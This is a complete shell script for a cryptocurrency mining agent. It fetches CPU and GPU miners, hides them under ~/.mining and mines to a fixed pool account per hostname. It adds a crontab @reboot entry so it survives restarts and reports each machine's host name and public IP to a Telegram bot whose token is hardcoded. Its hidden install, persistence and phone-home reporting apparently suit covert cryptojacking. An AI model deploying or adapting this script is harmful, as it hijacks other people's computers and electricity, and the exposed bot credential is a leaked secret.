#!/bin/sh
set -u
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

#################################################
# MINING AGENT — CPU + GPU + GPU HASHRATE
# FIXED TELEGRAM REPORTING + MODERN GPU SUPPORT
#################################################

# ===== TELEGRAM CONFIG =====
TG_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TG_CHAT_ID="5336452267"
TG_API="https://api.telegram.org/bot$TG_TOKEN/sendMessage"

# ===== MINING CONFIG =====
[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

# ===== PANEL =====
INTERVAL=30
HOST="$(hostname)"
PUBLIC_IP=$(curl -s https://api.ipify.org 2>/dev/null || echo "unknown")

# ===== ACCOUNTS =====
KRIPTEX="krxX3PVQVR"

# ===== POOLS =====
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== PATHS =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1
chmod 700 "$BASE" "$BIN" "$RUN" "$LOG" 2>/dev/null

#################################################
# UTILS - FIXED TELEGRAM
#################################################

tg_send() {
  local message="$1"
  # HTML formatting instead of Markdown
  curl -s -X POST "$TG_API" \
    -H "Content-Type: application/json" \
    -d "{\"chat_id\": \"$TG_CHAT_ID\", \"text\": \"$message\", \"parse_mode\": \"HTML\"}" \
    >/dev/null 2>&1 || echo "Failed to send Telegram message"
}

log_and_tg() {
  local message="$1"
  echo "$(date '+%Y-%m-%d %H:%M:%S') - $message" >> "$LOG/agent.log"
  tg_send "$message"
}

#################################################
# GPU DETECTION - MORE RELIABLE
#################################################

gpu_exists() {
  # Try multiple methods to detect GPU
  if command -v nvidia-smi >/dev/null 2>&1; then
    return 0
  elif command -v lspci >/dev/null 2>&1 && lspci 2>/dev/null | grep -qiE "nvidia|amd|ati|radeon"; then
    return 0
  elif [ -d /dev/dri ]; then
    return 0
  fi
  return 1
}

get_gpu_name() {
  if command -v nvidia-smi >/dev/null 2>&1; then
    nvidia-smi --query-gpu=name --format=csv,noheader,nounits 2>/dev/null | head -1 || echo "NVIDIA GPU"
  elif command -v lspci >/dev/null 2>&1; then
    lspci 2>/dev/null | grep -iE "(nvidia|amd|ati|radeon)" | head -1 | sed 's/.*://; s/\[.*//' || echo "GPU"
  else
    echo "Unknown GPU"
  fi
}

#################################################
# INSTALL - ADD T-REX FOR MODERN GPUS
#################################################

install_xmrig() {
  if [ -x "$BIN/cpu/xmrig" ]; then return 0; fi
  
  log_and_tg "🔧 Installing CPU miner (xmrig)..."
  
  for url in \
    "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" \
    "https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz"; do
    
    wget -q "$url" -O /tmp/xmr.tgz && break
  done
  
  [ $? -ne 0 ] && { log_and_tg "❌ Failed to download xmrig"; return 1; }
  
  mkdir -p /tmp/xmrig
  tar -xzf /tmp/xmr.tgz -C /tmp/xmrig --strip-components=1 || return 1
  cp /tmp/xmrig/xmrig "$BIN/cpu/" || return 1
  chmod +x "$BIN/cpu/xmrig" || return 1
  rm -rf /tmp/xmrig /tmp/xmr.tgz
  
  log_and_tg "✅ CPU miner installed"
}

install_lolminer() {
  if [ -x "$BIN/gpu/lolMiner" ]; then return 0; fi
  
  log_and_tg "🔧 Installing GPU miner (lolMiner)..."
  
  for url in \
    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" \
    "https://github.com/Lolliedieb/lolMiner-releases/download/1.97/lolMiner_v1.97_Lin64.tar.gz"; do
    
    wget -q "$url" -O /tmp/lol.tgz && break
  done
  
  [ $? -ne 0 ] && { log_and_tg "❌ Failed to download lolMiner"; return 1; }
  
  mkdir -p /tmp/lolminer
  tar -xzf /tmp/lol.tgz -C /tmp/lolminer || return 1
  cp /tmp/lolminer/1.98/lolMiner "$BIN/gpu/" 2>/dev/null || cp /tmp/lolminer/lolMiner "$BIN/gpu/" 2>/dev/null || return 1
  chmod +x "$BIN/gpu/lolMiner" || return 1
  rm -rf /tmp/lolminer /tmp/lol.tgz
  
  log_and_tg "✅ lolMiner installed"
}

install_trex() {
  if [ -x "$BIN/gpu/t-rex" ]; then return 0; fi
  
  log_and_tg "🔧 Installing T-Rex Miner (for modern NVIDIA GPUs)..."
  
  wget -q "https://github.com/trexminer/T-Rex/releases/download/0.30.1/t-rex-0.30.1-linux.tar.gz" -O /tmp/trex.tgz || return 1
  
  mkdir -p /tmp/trex
  tar -xzf /tmp/trex.tgz -C /tmp/trex || return 1
  cp /tmp/trex/t-rex "$BIN/gpu/" || return 1
  chmod +x "$BIN/gpu/t-rex" || return 1
  rm -rf /tmp/trex /tmp/trex.tgz
  
  log_and_tg "✅ T-Rex Miner installed"
}

#################################################
# MINER MANAGEMENT - AUTO-FAILOVER
#################################################

start_cpu() {
  stop_cpu
  log_and_tg "🔄 Starting CPU miner (XMR)..."
  
  nohup "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    --background --log-file="$LOG/cpu.log" \
    >/dev/null 2>&1 &
    
  echo $! > "$RUN/cpu.pid"
  sleep 5
  
  if [ -f "$RUN/cpu.pid" ] && kill -0 "$(cat "$RUN/cpu.pid")" 2>/dev/null; then
    log_and_tg "✅ CPU miner running"
    return 0
  else
    log_and_tg "❌ CPU miner failed to start"
    rm -f "$RUN/cpu.pid" 2>/dev/null
    return 1
  fi
}

stop_cpu() {
  [ -f "$RUN/cpu.pid" ] && kill "$(cat "$RUN/cpu.pid")" 2>/dev/null || true
  rm -f "$RUN/cpu.pid" 2>/dev/null
}

start_gpu() {
  if ! gpu_exists; then
    log_and_tg "⚠️ No GPU detected - skipping GPU mining"
    return 0
  fi
  
  stop_gpu
  local gpu_name=$(get_gpu_name)
  log_and_tg "🔄 Starting GPU miner for $gpu_name..."
  
  # Try T-Rex first for modern NVIDIA GPUs
  if [ -x "$BIN/gpu/t-rex" ]; then
    nohup "$BIN/gpu/t-rex" \
      -a etchash \
      -o stratum+tcp://"$ETC_POOL" \
      -u "$KRIPTEX.$HOST" \
      -p x \
      --api-bind-http 127.0.0.1:4068 \
      --no-watchdog \
      >> "$LOG/gpu.log" 2>&1 &
      
    echo $! > "$RUN/gpu.pid"
    sleep 15
    
    if [ -f "$RUN/gpu.pid" ] && kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null; then
      log_and_tg "✅ GPU miner started with T-Rex for $gpu_name"
      return 0
    fi
  fi
  
  # Fall back to lolMiner
  if [ -x "$BIN/gpu/lolMiner" ]; then
    nohup "$BIN/gpu/lolMiner" \
      --algo ETCHASH \
      --pool "$ETC_POOL" \
      --user "$KRIPTEX.$HOST" \
      --apihost 127.0.0.1 \
      --apiport 8080 \
      --disablewatchdog \
      >> "$LOG/gpu.log" 2>&1 &
      
    echo $! > "$RUN/gpu.pid"
    sleep 10
    
    if [ -f "$RUN/gpu.pid" ] && kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null; then
      log_and_tg "✅ GPU miner started with lolMiner for $gpu_name"
      return 0
    fi
  fi
  
  log_and_tg "❌ All GPU miners failed to start for $gpu_name"
  rm -f "$RUN/gpu.pid" 2>/dev/null
  return 1
}

stop_gpu() {
  [ -f "$RUN/gpu.pid" ] && kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
  rm -f "$RUN/gpu.pid" 2>/dev/null
}

#################################################
# HASHRATE COLLECTION
#################################################

get_cpu_hashrate() {
  curl -s --max-time 2 http://127.0.0.1:16000/1/summary 2>/dev/null | 
  grep -oE '"total":\[[^]]+' | 
  grep -oE '[0-9]+(\.[0-9]+)?' | 
  head -1 || echo "0"
}

get_gpu_hashrate() {
  # Try T-Rex API first
  local hr=$(curl -s --max-time 2 http://127.0.0.1:4068/trex 2>/dev/null | 
            grep -oE '"hashrate":([0-9.]+)' | 
            grep -oE '[0-9.]+')
  
  # Try lolMiner API
  [ -z "$hr" ] && hr=$(curl -s --max-time 2 http://127.0.0.1:8080/summary 2>/dev/null | 
                      grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' | 
                      grep -oE '[0-9]+(\.[0-9]+)?' | 
                      head -1)
  
  if [ -n "$hr" ]; then
    awk "BEGIN {printf \"%.0f\", $hr * 1000000}" 2>/dev/null <<< "$hr" || echo "${hr%.*}000000"
  else
    echo "0"
  fi
}

#################################################
# REPORTING - FIXED HTML FORMATTING
#################################################

send_startup_report() {
  local gpu_name=$(gpu_exists && get_gpu_name || echo "No GPU")
  tg_send "🚀 <b>MINING AGENT STARTED</b>\n🖥️ <b>Host:</b> $HOST\n🌐 <b>IP:</b> $PUBLIC_IP\n🎮 <b>GPU:</b> $gpu_name\n⚡ <b>Status:</b> Initializing miners..."
}

send_20min_report() {
  local cpu_hr=$(get_cpu_hashrate)
  local gpu_hr=$(get_gpu_hashrate)
  local gpu_name=$(gpu_exists && get_gpu_name || echo "No GPU")
  
  # Format nicely
  cpu_hr_fmt=$(echo "$cpu_hr" | awk '{printf "%.2f", $1/1000}')
  gpu_hr_fmt=$(echo "$gpu_hr" | awk '{printf "%.2f", $1/1000000}')
  
  tg_send "📊 <b>20-MINUTE MINING REPORT</b>\n🖥️ <b>Host:</b> $HOST\n🌐 <b>IP:</b> $PUBLIC_IP\n🎮 <b>GPU:</b> $gpu_name\n⚡ <b>Hashrate:</b>\n   • CPU (XMR): ${cpu_hr_fmt} kH/s\n   • GPU (ETC): ${gpu_hr_fmt} MH/s\n⏰ <b>Time:</b> $(date '+%a %b %d %H:%M:%S %Z %Y')"
}

send_restart_report() {
  local miner_type="$1"
  local gpu_name=$(gpu_exists && get_gpu_name || echo "No GPU")
  tg_send "🔄 <b>MINER RESTARTED</b>\n🖥️ <b>Host:</b> $HOST\n🎮 <b>GPU:</b> $gpu_name\n🔧 <b>Miner:</b> $miner_type\n⏰ <b>Time:</b> $(date '+%a %b %d %H:%M:%S %Z %Y')"
}

#################################################
# HEALTH CHECK & AUTOSTART
#################################################

health_check() {
  # CPU miner
  if [ -f "$RUN/cpu.pid" ]; then
    local pid=$(cat "$RUN/cpu.pid")
    if ! kill -0 "$pid" 2>/dev/null; then
      log_and_tg "🚨 CPU miner crashed! PID: $pid"
      send_restart_report "CPU (XMR)"
      start_cpu
    fi
  else
    log_and_tg "🚨 CPU miner not running!"
    send_restart_report "CPU (XMR)"
    start_cpu
  fi
  
  # GPU miner (if GPU exists)
  if gpu_exists; then
    if [ -f "$RUN/gpu.pid" ]; then
      local pid=$(cat "$RUN/gpu.pid")
      if ! kill -0 "$pid" 2>/dev/null; then
        log_and_tg "🚨 GPU miner crashed! PID: $pid"
        send_restart_report "GPU (ETC)"
        start_gpu
      fi
    else
      log_and_tg "🚨 GPU miner not running!"
      send_restart_report "GPU (ETC)"
      start_gpu
    fi
  fi
}

ensure_autostart() {
  # Crontab only - no sudo/systemd
  (crontab -l 2>/dev/null | grep -v "$BASE/min1.sh"; echo "@reboot sleep 30 && ALLOW_MINING=1 $BASE/min1.sh") | crontab -
}

#################################################
# MAIN AGENT LOOP
#################################################

agent() {
  echo "=== Mining Agent Started at $(date) ===" > "$LOG/agent.log"
  
  send_startup_report
  
  install_xmrig
  install_lolminer
  install_trex  # For modern NVIDIA GPUs
  
  ensure_autostart
  
  start_cpu
  start_gpu
  
  local start_time=$(date +%s)
  
  while true; do
    health_check
    
    # Send 20-minute report
    local current_time=$(date +%s)
    if [ $((current_time - start_time)) -ge 1200 ]; then
      send_20min_report
      start_time=$current_time
    fi
    
    sleep "$INTERVAL"
  done
}

#################################################
# CLEAN SHUTDOWN
#################################################

trap 'stop_cpu; stop_gpu; exit 0' TERM INT QUIT

agent
